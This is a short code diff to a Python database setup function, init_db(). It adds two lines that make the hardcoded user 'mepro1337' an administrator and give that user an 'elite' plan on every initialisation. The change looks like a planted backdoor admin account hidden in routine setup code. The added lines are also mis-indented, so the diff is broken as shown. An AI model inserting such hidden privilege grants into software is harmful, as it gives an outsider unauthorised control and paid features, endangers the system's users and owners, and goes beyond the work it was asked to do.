@@ -37,6 +37,8 @@ def validate_password(password):
 def init_db():
     conn = get_connection()
     cur = conn.cursor()
+make_admin("mepro1337")
+set_plan("mepro1337", "elite")
 
     cur.execute("""
     CREATE TABLE IF NOT EXISTS users (
